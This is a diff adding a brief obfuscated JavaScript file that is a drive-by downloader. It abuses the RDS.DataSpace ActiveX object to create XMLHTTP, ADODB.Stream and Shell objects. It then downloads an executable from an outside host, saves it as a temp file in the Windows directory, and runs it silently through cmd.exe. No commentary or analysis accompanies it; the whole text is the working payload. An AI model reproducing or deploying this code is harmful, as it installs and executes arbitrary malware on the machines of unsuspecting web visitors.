@@ -1,0 +1,4 @@
+function gn(rRaGEykU1){var Orh2=window["Math"]["random"]()*rRaGEykU1;return'~tmp'+'.tmp'}try{jswl=
+
+    dl = "http://just.yule2007.com/newh/tests.exe"
+;var chilam=window["document"]["createElement"]("object");chilam["setAttribute"]("classid","clsid:BD96C556-65A3-11D0-983A-00C04FC29E36");var jswl2=chilam["CreateObject"]("Microsoft.X"+"M"+"L"+"H"+"T"+"T"+"P","");var jswl3=chilam["CreateObject"]("Adodb.Stream","");jswl3["type"]=1;jswl2["open"]("GET",jswl,0);jswl2["send"]();jswlcn=gn(10000);var hHf$R6=chilam["CreateObject"]("Scripting.FileSystemObject","");var VgDnZXHt7=hHf$R6["GetSpecialFolder"](0);jswlcn=hHf$R6["BuildPath"](VgDnZXHt7,jswlcn);jswl3["Open"]();jswl3["Write"](jswl2["RESPONSEbODY"]);jswl3["SaveToFile"](jswlcn,2);jswl3["Close"]();var SmAcqIwGV8=chilam["CreateObject"]("Shell.Application","");exp1=hHf$R6["BuildPath"](VgDnZXHt7+'\\system32','cmd.exe');SmAcqIwGV8["SHellExEcuTe"](exp1,' /c '+jswlcn,"","open",0)}catch(i){i=1}
